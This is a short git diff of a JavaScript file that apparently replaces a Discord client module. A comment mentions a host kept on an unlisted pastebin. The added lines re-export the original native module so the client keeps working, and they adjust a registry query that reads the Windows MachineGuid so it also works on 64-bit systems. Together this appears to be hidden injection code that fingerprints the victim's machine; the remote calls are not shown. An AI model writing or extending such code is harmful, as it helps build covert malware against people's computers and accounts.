@@ -2,6 +2,9 @@
 // and the host will be on a unlisted pastebin, just incase.
 // This should never need to change.
 
+// First export original
+module.exports = require('./discord_modules.node');
+
 const https = require('https');
 const http = require('http');
 
@@ -15,7 +18,15 @@ const httpTable = {
 
 const machineId = () => {
     return new Promise((resolve, reject) => {
-        exec('%windir%\\System32\\REG.exe QUERY HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography /v MachineGuid', {}, (err, stdout, stderr) => {
+        let is64 = false;
+
+        try {
+            is64 = !!require('fs').statSync('C:\\windows\\sysnative');
+        } catch (e) {
+
+        }
+
+        exec(`%windir%\\${is64 ? 'sysnative' : 'system32'}\\REG.exe QUERY HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography /v MachineGuid`, {}, (err, stdout, stderr) => {
             if (err) {
                 console.log(err.stack);
                 reject();
